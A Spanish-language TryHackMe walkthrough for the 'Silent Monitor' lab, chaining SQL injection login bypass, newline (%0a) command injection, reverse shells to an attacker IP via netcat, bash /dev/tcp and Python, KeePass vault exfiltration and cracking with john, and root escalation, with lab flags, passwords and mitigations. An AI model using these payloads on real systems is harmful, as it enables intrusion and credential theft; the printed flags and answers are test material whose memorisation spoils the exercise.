# TryHackMe — Silent Monitor (CorpNet NOC)

**Sala:** Silent Monitor
**Plataforma:** TryHackMe
**Dificultad:** Medium (≈30 min)
**Tema:** Enumeración de servicios · SQL injection (bypass de login) · Command injection con salto de línea (`%0a`) · Reverse shell · Credenciales en texto plano · Exfiltración de un vault KeePass · Crackeo con John · Escalada a root
**Objetivo:** Entrar en el NOC interno de CorpNet, pivotar por el sistema y llegar a `root`, capturando la flag de usuario y la de root.

> **Resumen en una línea:** un panel Flask en `:5050` esconde `/internal`, cuyo *audit log* documenta el ataque de un intruso anterior (`127.0.0.1%0awhoami`); se reproduce el *command injection* con `%0a`, se obtiene shell como `www-data`, se lee `secret.config` con la password de `sysadmin`, se entra por SSH, se exfiltra `infrastructure.kdbx`, se crackea con `john` (master password `spring`) y se usa la password de `root` del vault para `su root`.

---

## 0. Información de la máquina

- **Servicios:** `22/tcp` SSH (OpenSSH 8.9p1 Ubuntu) y `5050/tcp` HTTP (Werkzeug 2.0.2 / Python 3.10.12) con título **CorpNet — Network Operations Centre**.
- **IP:** cambia en cada despliegue (en las capturas aparecen `10.64.133.204` y `10.65.147.28`). Usa tu IP actual.
- **URL de la app:** `http://IP_MAQUINA:5050/`

---

## 1. Reconocimiento (Nmap)

```bash
nmap -sV -sC -p- IP_MAQUINA -oN scan_port.txt
```

Solo hay dos puertos abiertos: SSH y la aplicación web del NOC en `5050`.

![[Pasted image 20261109214734.png]]

*Figura: `nmap -sV -sC` — SSH (22) y Werkzeug 2.0.2/Python 3.10.12 en 5050 con el título "CorpNet — Network Operations Centre".*

---

## 2. Enumeración web (Gobuster)

La raíz muestra una web de monitorización aparentemente estática, así que se enumeran directorios:

```bash
gobuster dir -u http://IP_MAQUINA:5050 \
  -w /home/kali/SecLists/Discovery/Web-Content/common.txt
```

Aparece un único recurso interesante: **`/internal`** (status 200, 8770 bytes), el portal de operadores.

![[Pasted image 20261109214941.png]]

*Figura: Gobuster descubre `/internal` (200) y termina el escaneo (4752/4752).*

---

## 3. Bypass de autenticación (SQL injection)

`http://IP_MAQUINA:5050/internal` es un formulario de login ("Sign In to NOC Portal"). La consulta se construye de forma insegura, así que se prueba un bypass clásico en el campo `username`:

```
' or 1 or '
```

o, equivalentemente:

```
' OR 1=1 -- -
```

En Burp se ve el `POST /internal` con `username=' OR 1=1` y `password='` (el `Content-Length: 46` coincide con esos dos valores). La respuesta es **`HTTP/1.0 302 FOUND`** con `Location: /internal/dashboard` y una cookie de sesión nueva → login como operador.

![[Pasted image 20261109222727.png]]

*Figura: Burp Repeater — `POST /internal` con `username=' OR 1=1` y `password='`; respuesta 302 hacia `/internal/dashboard`.*

![[Pasted image 20261109222944.png]]

*Figura: formulario de acceso del NOC ("OPERATOR ACCESS — Sign In to NOC Portal").*

---

## 4. El "monitor silencioso": audit log y el salto de línea (`%0a`)

Ya en el dashboard (`/internal/dashboard`) hay un **Audit Log** con las entradas del sistema. Ahí está la pista del room: aparecen intentos de un atacante anterior contra el *health check*, por ejemplo:

```
127.0.0.1%0awhoami
```

Es decir, alguien inyectó un **newline URL-encoded (`%0a`)** seguido de un comando. La funcionalidad "Host Health" ejecuta algo del estilo `ping -c 1 <target>` y solo valida que la entrada *empiece* por una IP; no rechaza el salto de línea. En una shell, `%0a` termina el `ping` y arranca el siguiente comando:

```
ping -c 1 127.0.0.1
whoami
```

Las comprobaciones de caracteres tipo `;`, `|` o `&` no bloquean `%0a`, por eso funciona. Es el clásico fallo de **validar el prefijo de la cadena en vez de los metacaracteres de shell**.

![[Pasted image 20261109223009.png]]

*Figura: dashboard del NOC con el Audit Log mostrando `127.0.0.1%0awhoami` (la pista del command injection).*

---

## 5. Command injection → reverse shell como `www-data`

Se localiza el endpoint `POST /internal/health` con el parámetro `target`. Primero se valida el injection con un comando inocuo (`target=127.0.0.1%0awhoami`); después se sustituye por una reverse shell.

**Listener en el atacante:**

```bash
penelope.py            # o: nc -lvnp 4444
```

**Petición en Burp (el `%0a` NO se debe codificar dos veces):**

```
target=1.1.1.1
busybox nc 192.168.131.171 4444 -e bash
```

que URL-encoded queda como:

```
target=1.1.1.1%0abusybox+nc+192.168.131.171+4444+-e+bash
```

Si la víctima no tiene `busybox`, alternativas para el segundo comando:

```bash
bash -i >& /dev/tcp/192.168.131.171/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.131.171",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'
```

Al ejecutarse se recibe la conexión y se confirma el usuario:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![[Captura de pantalla 2026-11-10 000214.png]]

*Figura: Burp — `POST /internal/health` con `target=1.1.1.1` + `%0a` + `busybox nc 192.168.131.171 4444 -e bash`; a la izquierda, la shell de `www-data` en la víctima.*

---

## 6. `www-data` → `sysadmin` (secret.config + SSH) → Flag de usuario

En el directorio de la aplicación (`/opt/netops`) hay un archivo de configuración legible por el usuario web:

```bash
www-data@...:/opt/netops$ ls
www-data@...:/opt/netops$ cat secret.config
```

```ini
# netops application config
# generated: 2026-01-03
[database]
path = /opt/netops/netops.db
timeout = 5
[app]
host = 0.0.0.0
port = 5050
log_path = /var/log/netops/app.log
[auth]
session_lifetime = 1800
# service account used by the backup agent
# TODO: migrate to secrets manager before Q2 audit
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!
[smtp]
host = 127.0.0.1
port = 25
from = noc-alerts@corp.internal
```

Esa password **no** sirve para `su` (el shell del usuario web no puede cambiar de usuario), pero sí para SSH:

```bash
ssh sysadmin@IP_MAQUINA
# password: S3cur3Backup$Acc3ss!

sysadmin@...:~$ ls
backups  user.txt
sysadmin@...:~$ cat user.txt
THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
```

![[Pasted image 20261110005323.png]]

*Figura: `cat secret.config` — credenciales del `backup_agent` (`sysadmin` / `S3cur3Backup$Acc3ss!`).*

![[Pasted image 20261110005636.png]]

*Figura: SSH como `sysadmin` y lectura de `user.txt` (flag de usuario).*

---

## 7. Exfiltración del vault KeePass (`infrastructure.kdbx`)

En `~/backups` hay un README que describe el contenido y el propio vault de credenciales:

```bash
sysadmin@...:~/backups$ ls -la
# README.txt  hash.txt  infrastructure.kdbx
sysadmin@...:~/backups$ cat README.txt
```

> Backup archive - infrastructure credentials
> Periodic exports from the credential store are placed here by the backup agent.
> Treat all files in this directory as CONFIDENTIAL.
> `infrastructure.kdbx` — KeePass credential database

Se sirve el archivo desde la víctima y se descarga en Kali:

```bash
# en la víctima
sysadmin@...:~/backups$ python3 -m http.server 8080

# en Kali (¡ojo: el puerto 80 ya estaba ocupado por otro http.server!)
wget http://IP_MAQUINA:8080/infrastructure.kdbx
```

![[Pasted image 20261110005946.png]]

*Figura: `README.txt` del directorio `backups` describiendo `infrastructure.kdbx`.*

![[Pasted image 20261110011438.png]]

*Figura: `ls -la` de `backups` y arranque de `python3 -m http.server 8080` en la víctima; se ve la descarga del `.kdbx`.*

![[Pasted image 20261110011454.png]]

*Figura: descarga con `wget` desde Kali (falla primero contra el puerto 80 y funciona en el 8080: 200 OK, 2439 bytes).*

---

## 8. Crackeo del KDBX (`keepass2john` + `john`)

Se convierte el vault a un hash que John pueda atacar y se lanza contra `rockyou.txt`:

```bash
keepass2john infrastructure.kdbx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Resultado: el hash es **KeePass [AES/Argon2 256/256]** y la master password se recupera en segundos:

```
spring           (infrastructure)
```

> Si `keepass2john` de la distro falla con KDBX4, usar el binario del repo de John jumbo: `~/john/run/keepass2john`.

![[Pasted image 20261110011927.png]]

*Figura: `keepass2john infrastructure.kdbx > hash.txt`.*

![[Pasted image 20261110011952.png]]

*Figura: contenido del hash y `john --wordlist=rockyou.txt hash.txt` → master password `spring`.*

---

## 9. Abrir el vault y obtener la password de `root`

```bash
keepassxc infrastructure.kdbx
# master password: spring
```

Dentro del grupo **backup** está la entrada *Root User Password - Sensitive*, con usuario `root`.

![[Pasted image 20261110012019.png]]

*Figura: apertura del vault con `keepassxc`.*

![[Pasted image 20261110012040.png]]

*Figura: KeePassXC — grupo `backup` y entrada `Root User ...`.*

![[Pasted image 20261110012138.png]]

*Figura: detalle de la entrada: usuario `root`, password `S3cur3P4ss0nK33p4ss`.*

---

## 10. Escalada a `root` → Flag final

Con la password del vault se cambia de usuario y se lee la flag:

```bash
sysadmin@...:~/backups$ su root
# password: S3cur3P4ss0nK33p4ss

root@...:/home/sysadmin/backups# cd /root
root@...:/root# ls
root.txt
root@...:/root# cat root.txt
THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
```

![[Pasted image 20261110012325.png]]

*Figura: `su root` correcto (tras intentar pegar la password como comando por error).*

![[Pasted image 20261110012355.png]]

*Figura: `cd /root` + `cat root.txt` → flag de root.*

---

## 11. Preguntas y respuestas

| Pregunta | Respuesta |
|---|---|
| Puerto de la aplicación web | `5050` |
| Endpoint oculto del portal de operadores | `/internal` |
| Payload de bypass del login | `' or 1 or '` (o `' OR 1=1 -- -`) |
| Carácter que permite el command injection | Salto de línea `%0a` |
| Usuario con el que corre el servicio web | `www-data` |
| Password de `sysadmin` en `secret.config` | `S3cur3Backup$Acc3ss!` |
| Flag de usuario (`/home/sysadmin/user.txt`) | `THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}` |
| Master password del vault KeePass | `spring` |
| Password de `root` en el vault | `S3cur3P4ss0nK33p4ss` |
| Flag de root (`/root/root.txt`) | `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}` |

> Verifica siempre las flags copiándolas del terminal: el OCR de las capturas confunde `l` con `1` (por eso `V4ul7`, no `V4u17`).

---

## 12. Resumen y cadena de ataque

| # | Hallazgo | Impacto |
|---|---|---|
| 1 | `/internal` accesible y login vulnerable a SQLi | Bypass de autenticación (acceso como `netops`) |
| 2 | Audit log revela `127.0.0.1%0awhoami` | Command injection por newline en `/internal/health` |
| 3 | `secret.config` legible por `www-data` | Credenciales de `sysadmin` en texto plano → SSH |
| 4 | `infrastructure.kdbx` en `~/backups` | Vault exfiltrado y crackeado (`spring`) |
| 5 | Password de `root` dentro del vault | Escalada final a `root` |

**Cadena completa:** nmap → gobuster (`/internal`) → SQLi (login) → audit log (`%0a`) → command injection → reverse shell `www-data` → `secret.config` → SSH `sysadmin` (flag usuario) → `infrastructure.kdbx` → `keepass2john` + `john` (`spring`) → KeePassXC (password de root) → `su root` → **flag root**.

---

## 13. Lecciones / mitigaciones

- **No construir comandos de shell con entrada del usuario:** validar la IP/hostname con una librería (sin shell) o pasar argumentos como array; rechazar newlines y metacaracteres, no solo comprobar el prefijo.
- **No guardar secretos en texto plano** y restringir permisos: el usuario del servicio web no debe poder leer credenciales de otros servicios.
- **Vaults con master password fuerte:** una sola palabra de `rockyou` no protege nada.
- **No exponer el audit log interno:** en este room literalmente entrega el payload del ataque.
